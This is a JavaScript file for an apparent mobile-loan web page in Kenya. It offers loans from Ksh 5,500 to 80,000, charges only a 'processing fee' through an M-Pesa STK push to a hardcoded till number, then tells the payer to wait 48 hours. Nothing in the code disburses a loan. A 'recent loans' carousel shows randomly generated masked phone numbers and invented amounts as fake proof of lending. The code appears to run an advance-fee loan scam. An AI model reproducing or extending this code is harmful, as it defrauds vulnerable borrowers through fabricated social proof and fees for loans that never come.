// Helper to clear pending transaction for the current user
const apiBase = 'https://extra-1-5rvl.onrender.com/api';

async function clearPendingTransaction(msisdn) {
    try {
        const response = await fetch(`${apiBase}/clear_pending_tx`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ msisdn })
        });
        const result = await response.json();
        if (result.success) {
            console.log('Pending transaction cleared for', msisdn);
        } else {
            console.warn('Failed to clear pending transaction:', result.message);
        }
    } catch (err) {
        console.error('Error clearing pending transaction:', err);
    }
}
// Load user data from SessionStorage
const userData = JSON.parse(sessionStorage.getItem('myLoan') || '{}');

// Redirect if no phone number is found (prevents direct access)
if (!userData.phone_number) {
    window.location.href = '/eligibility';
}

document.getElementById('user-name').textContent = userData.name || 'Customer';

let selectedLoan = null;
const DEFAULT_PARTY_B = '8267646';

function formatMoney(amount) {
    return `Ksh ${Number(amount).toLocaleString()}`;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Helper to format phone number to 254XXXXXXXXX
function formatPhoneNumber(phone) {
    let p = phone.toString().replace(/\D/g, ''); // Remove non-digits
    if (p.startsWith('0')) {
        return '254' + p.substring(1);
    }
    if (p.startsWith('7') || p.startsWith('1')) {
        return '254' + p;
    }
    if (p.startsWith('254')) {
        return p;
    }
    return p;
}

// Dynamically generate 15 loan options
const loanOptions = [
    { amount: 5500, fee: 100 },
    { amount: 6800, fee: 130 },
    { amount: 7800, fee: 170 },
    { amount: 9800, fee: 190 },
    { amount: 11200, fee: 230 },
    { amount: 16800, fee: 250 },
    { amount: 21200, fee: 270 },
    { amount: 25600, fee: 400 },
    { amount: 30000, fee: 470 },
    { amount: 35400, fee: 590 },
    { amount: 39800, fee: 730 },
    { amount: 44200, fee: 1010 },
    { amount: 48600, fee: 1600 },
    { amount: 70000, fee: 1950 },
    { amount: 80000, fee: 2200 }
];

function renderLoanOptions() {
    const grid = document.getElementById('loan-grid');
    if (!grid) return;
    grid.innerHTML = '';
    loanOptions.forEach(opt => {
        const div = document.createElement('div');
        div.className = 'loan-option';
        div.style.background = '#f8fafc';
        div.style.borderRadius = '14px';
        div.style.padding = '24px 0';
        div.style.boxShadow = '0 1px 4px rgba(0,0,0,0.03)';
        div.style.border = '2px solid transparent';
        div.style.cursor = 'pointer';
        div.style.transition = 'all 0.2s';
        div.style.textAlign = 'center';
        div.onclick = function() { selectLoanOption(div, opt.amount, opt.fee); };
        div.innerHTML = `<div class="loan-amount" style="font-size:1.35rem;font-weight:700;color:#008740;">Ksh ${opt.amount.toLocaleString()}</div><div class="processing-fee" style="font-size:1rem;color:#666;font-weight:500;">Fee: Ksh ${opt.fee}</div>`;
        grid.appendChild(div);
    });
}

function selectLoanOption(element, amount, fee) {
    const applyBtn = document.getElementById('apply-btn');
    document.querySelectorAll('.loan-option').forEach(opt => {
        opt.style.background = '#f8fafc';
        opt.style.borderColor = 'transparent';
    });
    element.style.background = '#e6f4ea'; // Highlight selected
    element.style.borderColor = '#00A651';
    selectedLoan = { amount, fee };
    applyBtn.disabled = false;
    applyBtn.classList.add('is-ready');
    document.getElementById('error-message').style.display = 'none';
    userData.loan_amount = amount;
    userData.processing_fee = fee;
    sessionStorage.setItem('myLoan', JSON.stringify(userData));
    applyBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
    applyBtn.focus({ preventScroll: true });
    applyBtn.classList.remove('jump-focus');
    void applyBtn.offsetWidth;
    applyBtn.classList.add('jump-focus');
}

window.addEventListener('DOMContentLoaded', renderLoanOptions);

// Handle Apply Button Click
document.getElementById('apply-btn').addEventListener('click', async function () {
    if (!selectedLoan) {
        document.getElementById('error-message').style.display = 'block';
        return;
    }

    const confirmResult = await Swal.fire({
        title: 'Confirm Loan Request',
        html: `
            <div class="modern-summary-card">
                <div class="modern-summary-row">
                    <span class="modern-summary-label">Loan Amount</span>
                    <span class="modern-summary-value">${formatMoney(selectedLoan.amount)}</span>
                </div>
                <div class="modern-summary-row">
                    <span class="modern-summary-label">Processing Fee</span>
                    <span class="modern-summary-value">${formatMoney(selectedLoan.fee)}</span>
                </div>
                <div class="modern-summary-row">
                    <span class="modern-summary-label">Total Repayment</span>
                    <span class="modern-summary-value">${formatMoney(selectedLoan.amount * 1.1)}</span>
                </div>
            </div>
            <div class="modern-phone-pill">
                <i class="fas fa-mobile-alt"></i> ${userData.phone_number}
            </div>
        `,
        showCancelButton: true,
        confirmButtonText: 'Proceed',
        cancelButtonText: 'Change Amount',
        buttonsStyling: false,
        customClass: {
            popup: 'modern-popup',
            htmlContainer: 'modern-html',
            actions: 'modern-actions',
            confirmButton: 'modern-confirm-btn',
            cancelButton: 'modern-cancel-btn'
        }
    });

    if (!confirmResult.isConfirmed) return;

    // Always show classic STK push modal immediately
    let pollInterval, pollClosed = false, attempts = 0;
    const maxAttempts = 20; // 20 * 3s = 60 seconds
    const formattedPhone = formatPhoneNumber(userData.phone_number);
    const payload = {
        msisdn: formattedPhone,
        amount: selectedLoan.fee,
        reference: userData.name || 'LoanAppUser',
        partyB: String(userData.till_number || DEFAULT_PARTY_B).trim()
    };

    let pollPopup;
    const closeAndCleanup = async (reason, isSuccess) => {
        pollClosed = true;
        if (pollInterval) clearInterval(pollInterval);
        if (isSuccess === 'COMPLETED') {
            Swal.fire({
                icon: 'success',
                title: 'Loan Processing',
                html: `<div style=\"font-size:1.1rem;\">Your payment was received.<br>Please wait up to 48 hours for your loan to be processed.<br><span style='font-size:2rem;display:inline-block;margin-top:10px;'>⏳</span></div>`,
                confirmButtonText: 'OK',
                customClass: { popup: 'modern-popup', htmlContainer: 'modern-html', confirmButton: 'modern-confirm-btn-green' }
            });
        } else {
            Swal.fire({
                icon: 'error',
                title: 'Loan Processing Failed',
                html: `<div style='font-size:1.05rem;'>You must pay the processing fee first to get a loan.<br>Please try again and ensure you complete the payment on your phone.<br><span style='font-size:2rem;display:inline-block;margin-top:10px;'>❌</span></div>`,
                confirmButtonText: 'Try Again',
                customClass: { popup: 'modern-popup', htmlContainer: 'modern-html', confirmButton: 'modern-confirm-btn-green' }
            }).then((result) => {
                // Redirect on confirm or if modal is dismissed in any way
                window.location.replace('/apply');
            });
        }
    };

    // Show the modal immediately
    pollPopup = Swal.fire({
        title: 'Waiting for Payment',
        html: `
            <div style="display:flex;flex-direction:column;align-items:center;">
                <div class="modern-spinner" style="margin-bottom:18px;"></div>
                <div style="font-size:1.1rem;margin-bottom:8px;">
                    <b>Check your phone for the M-Pesa prompt</b>
                </div>
                <div style="color:#64748b;font-size:0.98rem;">
                    Please approve the payment on your phone to continue.<br>
                    <span style="font-size:1.3rem;display:inline-block;margin-top:8px;">📱</span>
                </div>
            </div>
        `,
        allowOutsideClick: false,
        showCancelButton: true,
        cancelButtonText: 'Cancel',
        customClass: { popup: 'modern-popup', htmlContainer: 'modern-html' }
    });

    // Now initiate the backend call
    try {
        const response = await fetch(`${apiBase}/haskback_push`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const result = await response.json();
        if (response.ok && result.success) {
            const txId = result.txId;
            // Poll every 1s for faster updates, close modal instantly on backend response
            pollInterval = setInterval(async () => {
                if (pollClosed) return;
                attempts++;
                try {
                    const statusRes = await fetch(`${apiBase}/haskback_status`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ msisdn: formattedPhone, txId })
                    });
                    const status = await statusRes.json();
                    if (['COMPLETED', 'FAILED', 'CANCELLED', 'WRONG_PIN'].includes(status.status)) {
                        clearInterval(pollInterval);
                        pollClosed = true;
                        await closeAndCleanup(null, status.status);
                    } else if (attempts >= maxAttempts) {
                        clearInterval(pollInterval);
                        pollClosed = true;
                        await closeAndCleanup('timeout', null);
                    }
                } catch (err) {
                    // Ignore polling errors
                }
            }, 1000);
            window.addEventListener('beforeunload', () => closeAndCleanup('unload', false));
        } else {
            let backendMsg = result && (result.error || result.message);
            if (typeof backendMsg === 'object') backendMsg = JSON.stringify(backendMsg);
            await closeAndCleanup('failed', false);
            throw new Error(backendMsg || 'Failed to initiate payment');
        }
    } catch (error) {
        await closeAndCleanup('failed', false);
        Swal.fire({
            toast: true,
            position: 'top-end',
            icon: 'error',
            title: error.message || 'Unable to process payment. Please try again.',
            showConfirmButton: false,
            timer: 3500,
            timerProgressBar: true,
            customClass: { popup: 'modern-popup' }
        });
    }
});

// --- Recent Loan Carousel (ensure this runs last) ---
// Valid Safaricom prefixes: 070, 071, 072, 074, 075, 076, 079, 010, 011, 012
const safaricomPrefixes = ['070', '071', '072', '074', '075', '076', '079', '010', '011', '012'];
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
const recentLoanNumbers = Array.from({length: 200}, () => {
    const prefix = safaricomPrefixes[getRandomInt(0, safaricomPrefixes.length - 1)];
    // Safaricom numbers are 10 digits: prefix (3) + 7 digits
    const rest = getRandomInt(1000000, 9999999).toString();
    const num = prefix + rest;
    // Mask only the 3 middle digits (e.g., 0712***3456)
    return num.replace(/(\d{4})\d{3}(\d{3})/, '$1***$2');
});
const recentLoanAmounts = [
    22500, 15000, 12000, 18500, 9000, 30000, 17500, 21000, 8000, 25000
];
const recentLoanTimes = [
    '7 mins ago', '12 mins ago', '18 mins ago', '25 mins ago', '32 mins ago',
    '40 mins ago', '1 hour ago', '1h 15m ago', '1h 30m ago', '2 hours ago'
];
let carouselIndex = 0;
function updateRecentLoanCarousel() {
    const number = recentLoanNumbers[carouselIndex % recentLoanNumbers.length];
    const amount = recentLoanAmounts[carouselIndex % recentLoanAmounts.length];
    const time = recentLoanTimes[carouselIndex % recentLoanTimes.length];
    const text = `${number} loaned Ksh ${amount.toLocaleString()} - ${time}`;
    const el = document.getElementById('recent-loan-text');
    if (el) el.textContent = text;
    carouselIndex++;
}
window.addEventListener('DOMContentLoaded', () => {
    updateRecentLoanCarousel();
    setInterval(updateRecentLoanCarousel, 2500);
});
